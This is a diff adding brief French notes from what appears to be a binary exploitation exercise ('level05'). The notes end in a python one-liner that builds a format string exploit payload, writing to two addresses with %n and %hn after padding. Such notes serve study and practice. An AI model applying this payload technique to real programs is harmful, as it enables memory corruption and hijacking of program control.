@@ -1,0 +1,4 @@
+0xffff = octets hauts preferable de rajouter 1 devant -> 0x1ffff
+d7f2 = octets bas
+														(nb octets bas - 8)			(nb octets haut - nb octet bas)
+python -c "print '\xe0\x97\x04\x08' + '\xe2\x97\x04\x08' + '%65527o' + '%10\$n' + '%56834o' + '%11\$hn'" > /tmp/level05
